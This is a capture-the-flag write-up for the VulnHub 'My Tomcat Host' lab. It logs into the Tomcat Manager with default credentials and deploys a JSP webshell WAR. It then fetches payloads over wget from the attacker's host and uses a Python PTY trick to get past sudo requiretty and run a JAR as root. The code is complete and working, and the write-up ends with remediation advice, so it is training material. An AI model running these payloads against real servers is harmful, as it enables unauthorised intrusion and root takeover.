# My Tomcat Host — Writeup

**Difficulty:** Easy / Beginner
**Category:** VulnHub — Boot2Root
**OS:** CentOS Linux 7 — Kernel 3.10.0-1062
**Platform:** VulnHub
**Author:** Akanksha Sachin Verma
**Source:** https://www.vulnhub.com/entry/my-tomcat-host-1,457/

---

## Overview

A CentOS 7 machine running Apache Tomcat 9.0.31 with default credentials. The Manager GUI allows deploying a malicious WAR (JSP webshell), giving remote code execution as `tomcat (uid=998)`. The `tomcat` user has a sudo rule granting `NOPASSWD` execution of a specific `java` binary. However, `Defaults requiretty` in sudoers blocks `sudo` from a webshell (no TTY). A Python PTY script using `os.openpty()` + `TIOCSCTTY` synthesizes a real terminal, bypassing `requiretty` and allowing `sudo java -jar <malicious.jar>` as root.

**Vulnerabilities:**
- Tomcat Manager default credentials (`tomcat:tomcat`)
- Unrestricted WAR deployment → RCE
- `sudo NOPASSWD java` with `requiretty` bypassable via Python PTY

**Flag:** `628435356e49f976bab2c04948d22fe4` (from `/root/proof.txt`)

---

## Prerequisites

- VirtualBox with the VM on a host-only network (e.g., `192.168.56.0/24`)
- Attacker IP assumed: `192.168.56.1` (adjust to match your host-only adapter)
- Tools: `nmap`, `curl`, `javac` (Java 8 compatible), `jar`, `python3`

---

## Attack Summary

```
Tomcat Manager default creds (tomcat:tomcat)
  → CSRF_NONCE extraction → WAR deploy
  → JSP webshell (tomcat, uid=998)
  → sudo NOPASSWD java (requiretty blocks direct sudo)
  → Python pty.openpty() + TIOCSCTTY → synthetic TTY
  → sudo java -jar malicious.jar → root
  → Flag: 628435356e49f976bab2c04948d22fe4
```

---

## Enumeration

### Host Discovery

```bash
nmap -sn 192.168.56.0/24
```

Identify the target. In this lab: `192.168.56.103`.

### Port Scan

```bash
nmap -sV -p 22,8080 192.168.56.103
```

Expected output:
```
22/tcp   open  ssh   OpenSSH 6.6.1
8080/tcp open  http  Apache Tomcat 9.0.31
```

Note: Tomcat is running directly on 8080 — no Apache front-end. SSH banner indicates password authentication is disabled; only key-based auth.

### Service Enumeration

```bash
curl -s http://192.168.56.103:8080/ | grep -i "Tomcat\|version"
```

Navigate to `http://192.168.56.103:8080/manager/html` — a 401 dialog appears, requesting credentials.

---

## Exploitation

### Step 1 — Test default credentials

```bash
curl -u tomcat:tomcat http://192.168.56.103:8080/manager/html | grep -i "OK\|Manager"
```

Expected: HTTP 200 — full Manager GUI HTML. Credentials **`tomcat:tomcat`** work.

*Additional credentials found in `conf/tomcat-users.xml` (readable via webshell later):*
```xml
<user username="tomcat" password="tomcat" roles="manager-gui"/>
<user username="admin"  password="admin"  roles="admin-gui"/>
```

### Step 2 — Build the JSP webshell WAR

```bash
mkdir -p /tmp/ws/WEB-INF

cat > /tmp/ws/cmd.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { sb.append("[ERR] ").append(line).append("\n"); }
    p.waitFor();
    out.print(sb.toString());
}
%>
EOF

cat > /tmp/ws/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app><display-name>Shell</display-name></web-app>
EOF

cd /tmp/ws && jar -cvf /tmp/cmdshell.war .
```

### Step 3 — Extract CSRF token and deploy the WAR

Tomcat 9 protects the Manager GUI with a CSRF token. Extract it before uploading.

```bash
CSRF=$(curl -s -u tomcat:tomcat \
  "http://192.168.56.103:8080/manager/html" \
  -c /tmp/cookies.txt \
  | grep -oP 'org\.apache\.catalina\.filters\.CSRF_NONCE=[A-F0-9]+' \
  | head -1 | cut -d= -f2)

echo "CSRF token: $CSRF"
```

```bash
curl -s -u tomcat:tomcat \
  -b /tmp/cookies.txt \
  "http://192.168.56.103:8080/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF" \
  -F "deployWar=@/tmp/cmdshell.war;type=application/octet-stream" | grep -i "OK\|deployed"
```

### Step 4 — Confirm RCE

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=id"
```

Expected output:
```
uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
```

### Step 5 — Enumerate privilege escalation vectors

```bash
# Check sudo rules
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=sudo -l 2>&1"
```

Expected output:
```
Matching Defaults entries for tomcat on my_tomcat:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS..."

User tomcat may run the following commands on my_tomcat:
    (ALL) NOPASSWD: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java
```

**Findings:**
- `sudo NOPASSWD` for a specific `java` binary — exploitable if we can run arbitrary JARs
- `requiretty` blocks `sudo` from the webshell (no controlling terminal)

---

## Privilege Escalation

### Why direct sudo fails from a webshell

```bash
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=sudo /usr/lib/jvm/.../java -version 2>&1"
# Output: sudo: sorry, you must have a tty to run sudo
```

The `requiretty` directive in `/etc/sudoers` requires sudo to be invoked from a real TTY. A webshell spawned via `Runtime.exec()` has no controlling terminal.

Common bypass attempts that **fail** in this environment:
- `sudo -n` — only skips the password prompt, not `requiretty`
- `script -q /dev/null -c "sudo ..."` — fails because `tomcat` has `/sbin/nologin` as shell

### Bypass via Python PTY synthesis

The approach: use Python's `os.openpty()` to create a master/slave pseudoterminal pair, then `fork()`. The child process calls `os.setsid()` to become a new session leader, uses `TIOCSCTTY` to make the slave PTY its controlling terminal, and then `exec`s `sudo java`. To sudo, the process looks like it is running in a real terminal.

```bash
# On the attacker machine, create the privilege-escalation JAR (Java 8 compatible)
mkdir -p /tmp/rootjar/src

cat > /tmp/rootjar/src/Main.java << 'EOF'
import java.io.*;
import java.nio.file.*;
public class Main {
    public static void main(String[] args) throws Exception {
        Process p = Runtime.getRuntime().exec(
            new String[]{"/bin/bash", "-c", "cat /root/proof.txt && id"});
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        String out = sb.toString();
        Files.write(Paths.get("/tmp/root_output.txt"), out.getBytes());
        System.out.println(out);
    }
}
EOF

# Compile with Java 8 target (required — the target JVM is 1.8)
cd /tmp/rootjar/src
javac -source 8 -target 8 Main.java
jar cfe /tmp/rootme.jar Main Main.class
```

> **Important:** Compile with `-source 8 -target 8` (or `--release 8`). If you compile on a modern JDK (17+) without this flag, the class file version will be incompatible with Java 8 on the target and the JAR will fail with `UnsupportedClassVersionError`.

```bash
# Create the PTY bypass script
cat > /tmp/pty_sudo.py << 'EOF'
import pty, os, sys, time, select, fcntl, termios

JAVA = "/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java"
JAR  = "/tmp/rootme.jar"

master, slave = os.openpty()   # Create master/slave PTY pair
pid = os.fork()

if pid == 0:
    # Child: become session leader and assign the slave PTY as controlling terminal
    os.close(master)
    os.setsid()
    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)  # This is the key: gives sudo a real tty
    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
    if slave > 2: os.close(slave)
    os.execvp("sudo", ["sudo", JAVA, "-jar", JAR])
    sys.exit(1)
else:
    # Parent: read output from the master side
    os.close(slave)
    output = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        r, _, _ = select.select([master], [], [], 1)
        if r:
            try:
                chunk = os.read(master, 4096)
                if chunk: output += chunk
            except OSError: break
    try: os.kill(pid, 9)
    except: pass
    os.waitpid(pid, os.WNOHANG)
    with open("/tmp/sudo_output.txt", "wb") as f: f.write(output)
EOF
```

**Serve files and execute on the target:**

```bash
# On attacker: serve both files
python3 -m http.server 8888 --directory /tmp &

# On target (via webshell): download files
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/rootme.jar -O /tmp/rootme.jar"

curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=wget http://192.168.56.1:8888/pty_sudo.py -O /tmp/pty_sudo.py"

# Execute PTY bypass
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=python /tmp/pty_sudo.py"
```

---

## Root Access

```bash
# Read the output captured by the PTY script
curl -s -X POST "http://192.168.56.103:8080/cmdshell/cmd.jsp" \
  --data-urlencode "cmd=cat /tmp/sudo_output.txt"
```

Expected output:
```
628435356e49f976bab2c04948d22fe4
uid=0(root) gid=0(root) groups=0(root)
```

**Root achieved.** Flag: `628435356e49f976bab2c04948d22fe4`

---

## Lessons Learned

1. **Tomcat 9 CSRF protection:** Unlike earlier versions, Tomcat 9's Manager GUI requires a `CSRF_NONCE` token in the upload URL. Extract it from the Manager HTML before sending the WAR — otherwise the upload returns a 403.

2. **`requiretty` bypass via Python PTY:** `os.openpty()` + `TIOCSCTTY` creates a real pseudoterminal, not just a pipe. The child process that `exec`s `sudo` genuinely has a controlling TTY, so `requiretty` is satisfied. This works even when the shell user has `/sbin/nologin`.

3. **Java class version compatibility:** Compile JAR payloads with `-source 8 -target 8` when the target runs Java 8. A JAR compiled on JDK 17+ will produce class files at version 61 (Java 17), which Java 8 (class version 52) refuses to load.

4. **`sudo NOPASSWD` + GTFOBins:** Any binary that can execute arbitrary code and is in a `sudo NOPASSWD` rule is a privilege escalation path. The `java` binary can run arbitrary JARs — see [GTFOBins/java](https://gtfobins.github.io/gtfobins/java/).

5. **Bash history as recon:** The `tomcat` user's `.bash_history` contained the exact `sudo java` command, confirming the intended escalation path before even running `sudo -l`.

---

## Remediation

| Finding | Fix |
|---------|-----|
| Default Tomcat credentials | Change `tomcat-users.xml` credentials; restrict Manager access to localhost |
| Unrestricted WAR deployment | Limit Manager GUI to trusted IPs; disable in production |
| `sudo NOPASSWD java` | Remove the sudo rule; if required, use a wrapper script with strict argument validation |
| `requiretty` bypass | `requiretty` is a weak control — do not rely on it as a security boundary; remove the sudo rule entirely |
